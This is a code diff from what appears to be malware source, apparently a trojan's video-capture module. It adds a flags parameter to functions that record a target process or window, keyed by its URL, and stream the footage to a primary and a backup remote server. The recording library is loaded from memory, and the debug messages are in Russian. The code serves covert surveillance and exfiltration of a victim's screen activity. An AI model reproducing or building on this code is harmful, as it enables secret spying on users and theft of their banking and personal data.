@@ -138,7 +138,7 @@ void TVideoRecorder::ReccordProcess(DWORD PID)
 	{
 		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
 						   Server.t_str(), Port,
-						   Server2.t_str(), Port2, RecordTime);
+						   Server2.t_str(), Port2, RecordTime, 0);
     }
 }
 //--------------------------------------------------------------
@@ -178,8 +178,8 @@ HMEMORYMODULE	hLibWndRec = NULL;
 
 //StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //запись по HWND окна
 //StartRecPid( char* uid, DWOD pid, char* ip, int port )  //запись по PID процесса
-typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds ) ;
-typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds );
+typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags ) ;
+typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2, int seconds, int flags );
 typedef VOID (WINAPI *TStopRec		)();
 typedef VOID (WINAPI *TResetTimer	)();
 
@@ -213,7 +213,7 @@ void StartRecordThread(DWORD pid,PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int 
 				ReservedIP = GetVideoRecHost2();
 			//Здесь надо получить второй айпи и порт(резервный)
 			VDRDBG("VIDEO","Все получили, теперь стартуем видео");
-			pStartRecPid(Buf, KeyWord, pid, ip, port, ReservedIP, port, 0);
+			pStartRecPid(Buf, KeyWord, pid, ip, port, ReservedIP, port, 0, 0);
 		};
 	};
 }
@@ -302,7 +302,7 @@ void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int 
 
 			//Здесь надо получить второй айпи и порт(резервный)
 			VDRDBG("VIDEO","Все готово запускаем");
-			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port, ReservedIP, port, 0);
+			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port, ReservedIP, port, 0, 0);
 		};
 	};
 }
@@ -509,7 +509,7 @@ namespace VideoRecorderSrv
 
 		// запускаем запись
 		VDRDBG("VideoRecorder", "Запущен поток записи видео с процесса %d URL %s", ClientPID, ClientURL);
-		Start(UID, ClientURL, ClientPID, IP1, Port, IP2, Port, 0);
+		Start(UID, ClientURL, ClientPID, IP1, Port, IP2, Port, 0, 0);
 
 		// ожидаем окончания записи
 		while (!ClientTerminated)
